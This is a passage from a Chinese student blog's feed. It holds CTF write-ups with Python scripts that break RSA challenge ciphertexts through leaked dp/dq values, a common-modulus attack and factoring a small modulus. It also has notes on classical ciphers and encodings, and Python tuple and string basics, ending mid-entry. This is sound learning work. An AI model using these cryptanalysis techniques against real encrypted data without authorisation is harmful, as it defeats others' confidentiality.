src="https://img-blog.csdnimg.cn/20200418140303202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其实通过这道题我学到很多，一点一点看</p><pre class="language-python" data-language="python"><code class="language-python">dp<span class="token operator">=</span>d<span class="token operator">%</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>dq<span class="token operator">=</span>d<span class="token operator">%</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>这个脚本不会写，我只会写那种异常的简单的小脚本，这种不会写。本人脸皮厚当个script boy。😪😪</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    InvQ <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> dq<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>InvQ<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq    <span class="token keyword">print</span> <span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>decrypt<span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span></code></pre><p>结果得到：<br><img src="https://img-blog.csdnimg.cn/2020042218574870.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p><img src="https://img-blog.csdnimg.cn/20200422191857834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>知道dp，n，e;求明文m.，我还是不会写脚本，现在才发现我这篇博客就是用来收集脚本的。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gpe <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><span class="token punctuation">)</span>dp <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><span class="token punctuation">)</span>c <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">%</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>x<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        q<span class="token operator">=</span>n<span class="token operator">//</span>p        phin<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        d<span class="token operator">=</span>gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>        m<span class="token operator">=</span>gp<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/2020042220082310.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><p><img src="https://img-blog.csdnimg.cn/20200422200908902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已知c1、c2、e1、e1、n 的情况</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> libnumn<span class="token operator">=</span><span class="token number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span>e1<span class="token operator">=</span><span class="token number">11187289</span>e2<span class="token operator">=</span><span class="token number">9647291</span>s <span class="token operator">=</span> gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> <span class="token operator">-</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>c1<span class="token operator">=</span><span class="token number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span>c2<span class="token operator">=</span><span class="token number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span>e2<span class="token operator">=</span><span class="token number">9647291</span>c2 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s1<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2 <span class="token punctuation">,</span> s2 <span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200422215606943.png" alt="Augenstern" loading="lazy"></p><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://img-blog.csdnimg.cn/2020042221563079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开压缩包，是两个文件<br><img src="https://img-blog.csdnimg.cn/20200422215723514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开这个文件(txt打开或者notepad++)<br>发现了公钥<br><img src="https://img-blog.csdnimg.cn/20200422215858649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在线解析公钥的网站直接解析出我们需要的信息<a href="https://www.ssleye.com/pub_asysi.html">在线解析公钥</a><br><img src="https://img-blog.csdnimg.cn/20200422215956515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到n和e<br>分解n得到p和q  ,可以使用yafu因数分解大数<br><img src="https://img-blog.csdnimg.cn/20200422221039998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>也可以在线网站分解，这个还不算大数，如果特别大的数还是yafu 比较好用啦。<br><img src="https://img-blog.csdnimg.cn/20200422220618503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>最后都能得出结果来<br>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200422231252274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>过程中遇到的错误：<br>原本我是在pycharm里跑脚本，但是跑这个脚本的时候 报错了。报错信息是这样的。<br><code>AttributeError: module &#39;rsa&#39; has no attribute &#39;PrivateKey&#39;</code><br><img src="https://img-blog.csdnimg.cn/20200422232637417.png" alt="Augenstern" loading="lazy"><br>这种报错毫无头绪，百度找不到类似的错误，然后我怀疑脚本的问题，然后又找找其他的脚本，但是发现报错信息差不多，都是这个地方。想起来我电脑上还安装了ipython，于是就试试，但是也跑不出来。就去问了问学长。学长说在kali里面试试。这个我还没试，因为那里面还没安装gmpy2这个库。明天再安装。这期间我发现错误就是路径的问题。倒数第二行代码，打开文件<code>flag.enc</code>这个文件，要添加路径，路径中原本的<code>\</code>在这里使用<code>\\</code>因为转义。我于是又在pycharm里跑了一次，但是没有结果，同样的错误。<br><strong>重点</strong>：我在ipython中试了一下，结果惊喜来了，成功了。就得到了上面的运行结果。<br>回头kali安装好gmpy2这个库之后我再试试这个题。<br>我还以为这篇博客真的要成为一篇纯粹收集脚本的文章了呢。还是有自己的收获的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rot13+base+md5等密码的基本了解</title>
      <link href="/posts/97fda567/"/>
      <url>/posts/97fda567/</url>
      
        <content type="html"><![CDATA[<h1 id="rot13密码"><a href="#rot13密码" class="headerlink" title="rot13密码"></a>rot13密码</h1><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。不过它好像凯撒密码的变形版，凯撒密码是将明文的字母向后移动三位的到密文：<br><img src="https://img-blog.csdnimg.cn/20200211135337793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>凯撒密码解密就是把密文在字母表中把各个字母向前移动三位，凯撒密码还可以变形有时候并不见得就是三位，可能是四位，八位……都有可能，而rot13就是移动13位，密文变回明文的话就再进行一次rot13加密就行了，因为13*2=26。<br>rot13比较常用，当然还有其它的rot密码，rot5,rot18……自行百度就行了，hhh</p><h1 id="base密码"><a href="#base密码" class="headerlink" title="base密码"></a>base密码</h1><p>base密码有base16,base32 ,base64。（听说还有base8，不过常用的应该是那三种。/）因为现在加密解密在百度上有大量的在线加密解密软件，所以我们只要见了能认出来就行，不用太深度探究。毕竟电脑计算要比普通人计算要快的多。<br><strong>1.base16</strong><br>特征：Base16编码就是将ASCII字符集中可打印的字符(数字0—9和字母A—F)对应的二进制字节数据进行编码<br><strong>2.base32</strong><br>特征：与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A—Z和数字2~7)对任意字节数据进行编码.<br><strong>3.base64</strong><br>特征：Base64编码使用了ASCII编码中64个可打印的字符(大写字母A—Z,小写字母a—z,数字0—9以及”+”,”/“)将任意字节数据进行编码，还有“=”也是base64的一个标志。</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>MD5密码的特征：16位或32位字母加数字组成的一段密文，字母大小统一。</p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>栅栏密码就是将要加密的明文分成N个一组，然后把每组的第i个字连起来，形成一段无规律的话。一般比较常见的是2栏的棚栏密码。但有些人不这样，他可能会设置3栏、4栏一组的。解密时可能要多尝试几次。<br>棚栏密码本身有一个潜规则，就是组成棚栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><h1 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h1><p>如果你看到一串字符里全是A和B，并且5个一组的时候，就是培根加密。培根加密只能加密字母。</p><h1 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h1><p>摩斯密码太耳熟了，小时候看电视剧，有些电视剧会有这些情节，而摩斯密码一般出现形式为 “.”和“-”或者为0和1。有时候也用音调的长短来加密。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(3)</title>
      <link href="/posts/e871c250/"/>
      <url>/posts/e871c250/</url>
      
        <content type="html"><![CDATA[<p>前言：这次继续学python：<br>==1.元组（与列表很像，但又不是列表。奇奇怪怪）==<br>==2.字符串==<br>==3.序列==</p><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><h5 id="创建和访问一个元组"><a href="#创建和访问一个元组" class="headerlink" title="创建和访问一个元组"></a>创建和访问一个元组</h5><p><code>tuple</code>连老规矩我都懒得说了。往下瞅</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span></code></pre><p>元组呢，跟列表不同的地方就在列表是用中括号的，而元组则是用小括号的，当然这不是重点。<strong>重点是：列表可以随意更改、删除、添加列表里的元素；而元组就不能更改元组里的元素。</strong><br><img src="https://img-blog.csdnimg.cn/20200223210855543.png" alt="在这里插入图片描述" loading="lazy"><br>我一改，他就报错了。不让改。<br><img src="https://img-blog.csdnimg.cn/20200223211542372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>对比这三个，为什么<code>temp = (1)</code>带了括号不是元组，而temp1不带小括号却是元组？ 因为：<strong>是不是元组取决于那个==逗号==而不是括号</strong>，再看第三个例子就明白了。<br>为什么说元组跟列表很像呢？？？因为元组也可以进行与列表相似的操作<br><img src="https://img-blog.csdnimg.cn/20200223212610674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这些操作与列表很像吧！！！</p><h5 id="更新和删除一个元组"><a href="#更新和删除一个元组" class="headerlink" title="更新和删除一个元组"></a><strong>更新和删除一个元组</strong></h5><p>不是说了，不能更改元组里的东西吗？？为什么还能更新？？？？这里可以用效仿更新字符串的方法，先切片，把字符串切成两部分再插入新的元素。对文字不太敏感看例子。没有什么是一个例子解决不了的。<br><img src="https://img-blog.csdnimg.cn/20200223215310460.png" alt="在这里插入图片描述" loading="lazy"><br>新的元组被创造出来（就是插入过元素后的元组）旧的元组就会被删掉，系统嫌它浪费资源，哈哈哈！！<br>插入时，注意<strong>括号和逗号</strong>不能丢，否则，，，否则怎样可以自己试试😎😎😎<br>删除呢就很简单，用del语句就行<br><img src="https://img-blog.csdnimg.cn/20200223215812330.png" alt="在这里插入图片描述" loading="lazy"><br>删除后再查看一下，不存在了，证明已经删除掉了。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>首先，字符串跟元组差不多，也不能随意更改，真要改就用切片法。定义就不废话了，<br>提取字符串里的字符，str[想要提取的字符的数字]，比如：str[5]<br>直接在字符串中插入字符串，用算数运算符“+”来插入，就像连接两个字符串一样。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> str1 <span class="token operator">=</span> <span class="token string">'I love flag'</span><span class="token operator">>></span><span class="token operator">></span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token string">'I love'</span><span class="token operator">>></span><span class="token operator">></span> str1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token string">'e'</span><span class="token operator">>></span><span class="token operator">></span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' 简单的'</span> <span class="token operator">+</span> str1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token string">'I love 简单的 flag'</span></code></pre><p>但是，再输入str1，<br><img src="https://img-blog.csdnimg.cn/2020030114484340.png" alt="在这里插入图片描述" loading="lazy"><br>还是老样子，没有变。难道真没法改？？<br>那再试试。<br><img src="https://img-blog.csdnimg.cn/20200301144948858.png" alt="在这里插入图片描述" loading="lazy"><br>这样就可以啦。</p><h4 id="字符串的各种内置方法（一小部分）："><a href="#字符串的各种内置方法（一小部分）：" class="headerlink" title="字符串的各种内置方法（一小部分）："></a>字符串的各种内置方法（一小部分）：</h4><p>1.连接方法，上面就是，不在多说，<br>内置函数<code>len()</code>返回对象（字符串、列表、元组等）长度或项目个数。用法如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token string">'hello,world!'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token number">12</span></code></pre><p>2.<code>strip()</code>strip英文翻译：脱掉，剥夺<br>strip()默认移除字符串两边的空白。只是返回处理后的副本，原来的值不变。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'    fuck     '</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">str</span><span class="token string">'    fuck     '</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'fuck'</span></code></pre><p>默认去除空白，但这个函数是有一个参数的，还可以这样用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> str1 <span class="token operator">=</span> <span class="token string">'666666dage6666666'</span><span class="token operator">>></span><span class="token operator">></span> str1<span class="token string">'666666dage6666666'</span><span class="token operator">>></span><span class="token operator">></span> str1<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span><span class="token string">'dage'</span><span class="token operator">>></span><span class="token operator">></span> str2 <span class="token operator">=</span> <span class="token string">'$$$$$$$大哥$$$$$$$$'</span><span class="token operator">>></span><span class="token operator">></span> str2<span class="token string">'$$$$$$$大哥$$$$$$$$'</span><span class="token operator">>></span><span class="token operator">></span> str2<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token string">'大哥'</span></code></pre><p>跟它一样的使用还有两个<code>lstrip()</code>和<code>rstrip()</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> str2<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token string">'大哥$$$$$$$$'</span><span class="token operator">>></span><span class="token operator">></span> str2<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token string">'$$$$$$$大哥'</span></code></pre><p>相信聪明的你已经看出来了<br>3.<code>capitalize()</code>返回首字母大写的副本，不改变原来的值：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj <span class="token operator">=</span> <span class="token string">'hello,world'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'Hello,world'</span></code></pre><p>4.<code>title()</code>返回标题样式的副本(单词首字母大写),不改变原来的值：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'hello,world'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'Hello,World'</span></code></pre><p>5.<code>upper()</code>返回所有字母大写的副本，不改变原来的值</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'hello,world'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'HELLO,WORLD'</span></code></pre><p>6.lower()返回所有字母小写的副本，不改变原来的值</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token operator">=</span><span class="token string">'Hello,World'</span><span class="token operator">>></span><span class="token operator">></span> lxj<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token 